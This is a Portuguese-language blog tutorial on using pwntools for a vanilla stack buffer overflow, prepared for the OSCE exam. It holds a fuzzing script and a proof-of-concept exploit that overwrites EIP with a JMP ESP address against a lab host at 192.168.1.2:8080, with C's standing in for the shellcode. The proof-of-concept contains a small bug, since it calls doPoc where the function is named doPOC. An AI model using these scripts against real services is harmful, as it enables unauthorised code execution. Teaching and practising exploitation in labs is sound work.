<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>Usando a pwntools para Binary Exploitation&nbsp;|&nbsp;www.offensivethink.com</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="Usando a pwntools para Binary Exploitation">
  
    <meta name="description" content="Uma forma de fazer binary exploitation usando a pwntools de forma a facilitar o processo de exploitation">
    <meta property="og:description" content="Uma forma de fazer binary exploitation usando a pwntools de forma a facilitar o processo de exploitation">
  
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="index.html">
    <div class="Navbar__Btn">
      
      <span>Home</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="referencia-rapida.html">
        <div class="Navbar__Btn">
          
          <span>→ Referência rápida ← </span>
        </div>
      </a>
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="contacts.html">
        <div class="Navbar__Btn">
          
            <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&amp;id=ca933149-5245-4511-a885-9cf5922808e1"></span>&nbsp;
          
          <span>about &amp; contacts</span>
        </div>
      </a>
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="offensivetools.html">
        <div class="Navbar__Btn">
          
          <span>Offensive Tools</span>
        </div>
      </a>
    
  
</nav>
  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
    <h1 class="Header__Title_post">Usando a pwntools para Binary Exploitation</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Tue, Nov 3, 2020</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--gray">
            <a href="tag/bof.html">bof</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
            <a href="tag/osce.html">osce</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
            <a href="tag/binary-exploitation.html">binary-exploitation</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/c2ce4e7ade98405ab7b1a9b1ff072eae" class="PageRoot"><div id="https://www.notion.so/a4a3a5e1054e49e38554f8d02bc85205" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Primeiramente, desculpem os &quot;estrangeirismos aportuguesados&quot; como atachar, dentre outros. Creio que na área, ajuda mais que atrapalha. </em></span></span></p></div><div id="https://www.notion.so/aa1becf5d042493d8a367345918e9498" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h2 id="https://www.notion.so/ded07b0af5bc46818b67634cfd50d150" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/ded07b0af5bc46818b67634cfd50d150"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">COMEÇANDO QUASE QUE DO COMEÇO</span></span></h2><div id="https://www.notion.so/4d5fc0f2232f4b989206506903e52893" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Esse não é uma explicação de como se constrói todo um exploit e também não aborda todos os porquês de seguirmos o passo a passo abaixo. É apenas uma &quot;dica&quot; na utilização da biblioteca pwntools na construção de exploits para exploração de buffer overflow. Estamos aqui tratando de um Buffer Overflow simples do tipo Vanilla.</em></span></span></p></div><div id="https://www.notion.so/7a3a231dfc06491c8de7e44075711ff9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Podemos usar a pwntools para nos ajudar em alguns pontos, como por exemplo: </span></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/90ef5bb3fefa41d893a094aaee593dea" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Gerar o pattern e descobrir o offset onde na pilha o valor que vai parar o EIP é sobreescrito sem precisar recorrer ao msf-pattern_* do metasploit</span></span></li><li id="https://www.notion.so/627210226c504e2683b57ee2d5cc9dd1" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Não precisar inverter bytes para respeitar o little endian</span></span></li><li id="https://www.notion.so/25d7bd5dd3194361a860c39940676c11" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">Abstrair a questão de como o python3 tratam as strings diferentemente do python2, o que causa vários problemas na hora do exploitation.</span></span></li></ol><div id="https://www.notion.so/c705ef47b117471187d23fddc534e8c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/Gallopsled/pwntools">pwntools</a></span><span class="SemanticString"> possui muitas e muitas funções, até mesmo para fechar conexão abstraindo a biblioteca socket. Isso ficará, quem sabe, para um próximo artigo.</span></span></p></div><div id="https://www.notion.so/10d5436708174403bc0c7a2252e7a6de" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><blockquote id="https://www.notion.so/fb295d77cc434046891e125060e8ba29" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed">A idéia é simples: </mark></strong></span><span class="SemanticString">Enviar </span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">já na fase de fuzzing</strong></span></span><span class="SemanticString"> um pattern que permita, já nesta fase, determinar rapidamente o offset onde vamos conseguir sobrescrever o EIP, ao invés de enviar A&#x27;s para determinar quando vai &quot;estourar&quot; e só depois construir o pattern para determinar o offset!</span></span></blockquote><blockquote id="https://www.notion.so/424423971fda482a81e94c13809900a1" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Outra idéia que não tem a ver com a bilbioteca em si, mas que agiliza, é logo no primeiro momento quando &quot;atachar&quot; o processo no immunity debbuger, já pesquisar pelo endereço do JMP ESP desejado.  </span></span></blockquote><div id="https://www.notion.so/d9a296c0638a42b7b79097e1743fcf3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fb50634ac1264fb083a96be81bfc0adf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Esta proposição não visa substituir a forma didática de aprender sobre o processo usando A&#x27;s, B&#x27;s e C&#x27;S, entendendo bem como os valores vão parar na pilha, mas sim avançar um pouco no processo.  </span></span></p></div><div id="https://www.notion.so/2f80b26e1aec479faa85adbeac4444f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Bem, a pwntools tem duas função que nos ajudarão:  </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cyclic(&lt;lenght&gt;)</code></span><span class="SemanticString"> , que serve para gerar padrões de tamanho determinado e </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cyclic_find(b&#x27;&lt;padrão encontrado&gt;&#x27;)</code></span><span class="SemanticString">, que serve para determinar o offset que desejamos. </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Observe o b antes da string</strong></mark></span><span class="SemanticString">, pois a função espera uma sequência de bytes. </span></span></p></div><div id="https://www.notion.so/160f121be73048119a3da790ca3e2ef8" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-01.png?width=432"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-01.png?width=432" style="width:432px"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">observe que o retorno da funçao cyclic é um byte array, em conformidade com o esperado para binary exploitation!</span></span></figcaption></figure></div><div id="https://www.notion.so/2237cd9631404e8f8e977912dc20a74b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5cb076d65b034562a274ee3577de11b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Bem, no debuger, quando o fuzzer surtir efeito e &quot;travar&quot; a aplicação, o que veremos escrito no EIP é um valor hexadecimal e não o padrão propriamente dito, ou seja, a sua representação hexadecimal. Poderíamos &quot;pegar&quot; o valor hexa que está em EIP, transformar em caracteres ascii e invertê-los (lembra do little endian?), mas a idéia é facilitar. </span></span></p></div><div id="https://www.notion.so/0537577a95964475ab626e0d0f729b15" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Neste caso, podemos usar a função pack(&lt;end_hexa&gt;), para obter o padrão desejado. </span></span></p></div><div id="https://www.notion.so/2c01b7435bd840358b3786b98dd1110b" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img2.png?width=576"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img2.png?width=576" style="width:576px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/8fb5c8fcafe74ac29b3dfbb5859431d9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Observe que</strong></mark></span><span class="SemanticString">, usando a pwntools, </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">não precisaremos importar a biblioteca struct, </strong></mark></span><span class="SemanticString">ela já possue sua função pack. Basta pegar o hexa que tem no EIP, colocar dentro da função pack, passar o resultado para o cyclic_find e Voilá, offset definido! </span></span></p></div><div id="https://www.notion.so/a70c0f19ea7448f38b37feac35bf42ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/44349cd0dc2440a28a704991527f5d00" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E como ficaria isso no código, propriamente dito ? </span></span></p></div><div id="https://www.notion.so/361376d6ed2e432e834935e082eb7ee6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e1f3116ba15446d6a36eb03254cd9450" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">FUZZING</strong></span></span></span></p></div><div id="https://www.notion.so/56151fde536744a09872aba22375a752" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Desta forma passaremos já o padrão em incrementos de 50 em 50 bytes.</span></span></p></div><pre id="https://www.notion.so/494c33f3df5c4fe9aea18a1c3bef1882" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> sys<span class="token punctuation">,</span> socket
<span class="token keyword">from</span>  pwn <span class="token keyword">import</span> <span class="token operator">*</span>
host<span class="token operator">=</span><span class="token string">"192.168.1.2"</span>
port<span class="token operator">=</span><span class="token number">8080</span>

<span class="token comment">#Passo 1 - Fuzzing!</span>
<span class="token keyword">def</span> <span class="token function">doFuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      
        <span class="token builtin">buffer</span><span class="token operator">=</span><span class="token string">b"CMD "</span> <span class="token operator">+</span> </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span>cyclic</span></strong></mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span>i<span class="token punctuation">)</span></span></mark></span><span class="SemanticString"><span> <span class="token comment"># de 50 em 50 bytes!</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Sending %d bytes - %s \n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">buffer</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> 
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

doFuzz<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></span></span></code></pre><div id="https://www.notion.so/1dc89161c1a84873b256cbfad6ecfd8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/206afcbebaf048c7ab9a6c189118d249" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Após o fuzzing podemos já capturar o valor que está em EIP, que vamos usar para definir o offset que precisamos, </span></span></p></div><div id="https://www.notion.so/d17a8d9cb90d451f9edf207ef1d5dc5d" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-03.png?width=528"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-03.png?width=528" style="width:528px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/44b9590819e14091878fb52c0350e8c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">e o valor do endereço de um jmp esp, através do mona.py, que usaremos para direcionar para o EIP.</span></span></p></div><div id="https://www.notion.so/92c8b4a893a4445380c430b20f46c7f9" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-04.png?width=624"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-04.png?width=624" style="width:624px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/49f34b5f33104e829bb049899e6f7b39" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Vamos ao POC, já que temos tudo, offset e endereço do JMP ESP.</span></span></p></div><div id="https://www.notion.so/ec99516042004d1a990b6af63d2246d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/212ca93e9e9d4f65b8174f3c627361b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">POC  - Offset do EIP definido + Endereço do JMP ESP definido.</strong></span></span></span></p></div><pre id="https://www.notion.so/d90a5848c157475bb7831790042cbc82" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> sys<span class="token punctuation">,</span> socket
<span class="token keyword">from</span>  pwn <span class="token keyword">import</span> <span class="token operator">*</span>
host<span class="token operator">=</span><span class="token string">"192.168.1.2"</span>
port<span class="token operator">=</span><span class="token number">8080</span>

<span class="token keyword">def</span> <span class="token function">doPOC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

		totalBufferLenght <span class="token operator">=</span> <span class="token number">700</span> <span class="token comment"># valor desejado do buffer total </span>
		
		<span class="token comment"># addressFoundinEIP</span>
		<span class="token comment"># Valor obtido do reg EIP atraves do debug</span>
		<span class="token comment"># quando executado o Fuzzing!</span>
		<span class="token comment"># Observe que é um padrão em Hexa </span>
		<span class="token comment"># print("\x61\x61\x6C\x62") = aalb</span>
		addressFoundinEIP<span class="token operator">=</span><span class="token number">0x61616C62</span>
		
		offsetEIP<span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span>pack<span class="token punctuation">(</span>addressFoundinEIP<span class="token punctuation">)</span><span class="token punctuation">)</span>
		
		
		
		<span class="token comment"># Construção do que vamos enviar para o binário</span>
		<span class="token comment"># 1. Bytes iniciais quaisquer, neste caso A's, até o offset desejado</span>
		bufferInicial<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"CMD "</span> <span class="token operator">+</span> <span class="token string">"A"</span> <span class="token operator">*</span> offsetEIP<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span> 
		
		<span class="token comment"># 2. Valor que desejamos que vá parar em EIP para que a CPU execute</span>
		<span class="token comment"># um JMP ESP, que será onde estará posicionado nosso ShellCode. </span>
		<span class="token comment"># Endereço de um JMP ESP desejado obtido no immunity debug com o comando</span>
		<span class="token comment"># !mona jmp -r ESP -n </span>
		adressToJMPESP <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token number">0x7274146F</span><span class="token punctuation">)</span> 
		
		
		<span class="token comment"># 3. Shellcode propriamente dito. </span>
		<span class="token comment"># Neste ponto, para validação, apenas uma quantidade de C's igual a </span>
		<span class="token comment"># Tamanho total do Buffer que definimos como aceitável para: extrapolar</span>
		<span class="token comment"># o buffer da aplicação escrevendo A's + escrever o endereço que desejamos</span>
		<span class="token comment"># que vá para o EIP + nosso shell code. Neste caso, estimamos um buffer total </span>
		<span class="token comment"># de 700 bytes. Poderia ser mais, poderia ser menos, mas esse foi aceitável.</span>
		lengthShellCode <span class="token operator">=</span> totalBufferLenght <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bufferInicial<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>adressToJMPESP<span class="token punctuation">)</span>  
		shellcode<span class="token operator">=</span> <span class="token string">b'C'</span><span class="token operator">*</span>lengthShellCode <span class="token comment"># </span></span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><span>observe o b para indicar byte array!</span></mark></span><span class="SemanticString"><span>
		
		<span class="token builtin">buffer</span><span class="token operator">=</span>bufferInicial<span class="token operator">+</span>adressToJMPESP<span class="token operator">+</span>shellcode
		
		s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
		s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
		s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Sending Exploit %s"</span> <span class="token operator">%</span> <span class="token builtin">buffer</span> <span class="token punctuation">)</span>
		s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

doPoc<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/5d421c1ca264486db1533e6ae8078a67" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a28169127948491a89bdf5905c477ba3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Pronto, agora é continuar em achar os null bytes, gerar o shell code, explorar e ser feliz! </span></span></p></div><div id="https://www.notion.so/e508c644618f46ba872cc3c09f40db0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Espero que ajude. </span></span></p></div></article>
  <footer class="Footer">
  <div>&copy; www.offensivethink.com 2019-2021</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>
</body>

</html>